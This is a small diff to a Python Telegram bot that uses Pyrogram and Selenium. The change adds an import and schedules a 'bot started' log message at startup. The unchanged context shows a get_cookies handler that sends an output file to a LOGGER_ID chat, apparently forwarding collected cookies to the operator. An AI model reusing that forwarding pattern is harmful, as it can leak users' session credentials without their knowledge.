@@ -1,6 +1,8 @@
 import os
 import tempfile
 import shutil
+import asyncio
+from logger import bot_started_log
 from pyrogram import Client, filters
 from pyrogram.errors import UserNotParticipant
 from selenium import webdriver
@@ -104,5 +106,7 @@ async def get_cookies(client, message):
         await app.send_document(LOGGER_ID, output_file, caption=caption)
     except Exception as e:
         print(f"Failed to send log: {e}")
+
+asyncio.get_event_loop().create_task(bot_started_log(app))
 
 app.run()
